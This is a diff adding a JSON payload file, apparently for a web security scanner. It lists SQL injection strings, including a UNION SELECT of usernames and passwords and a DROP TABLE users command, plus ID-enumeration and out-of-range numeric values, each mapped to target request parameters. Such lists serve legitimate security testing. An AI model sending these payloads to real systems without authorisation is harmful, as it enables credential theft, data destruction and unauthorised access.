@@ -1,0 +1,44 @@
+{
+    "SQL_INJECTION": {
+        "payloads": [
+            "' OR 1=1--",
+            "' UNION SELECT username, password FROM users--",
+            "'; DROP TABLE users--",
+            "admin'--"
+        ],
+        "target_params": [
+            "username",
+            "id",
+            "search"
+        ]
+    },
+    "IDOR": {
+        "payloads": [
+            "1",
+            "2",
+            "3",
+            "4",
+            "5",
+            "999"
+        ],
+        "target_params": [
+            "account_id",
+            "user_id"
+        ]
+    },
+    "INTEGER_OVERFLOW": {
+        "payloads": [
+            "-1",
+            "-1000",
+            "-9999999",
+            "2147483648",
+            "-1.5",
+            "-1e10"
+        ],
+        "target_params": [
+            "amount",
+            "quantity",
+            "balance"
+        ]
+    }
+}
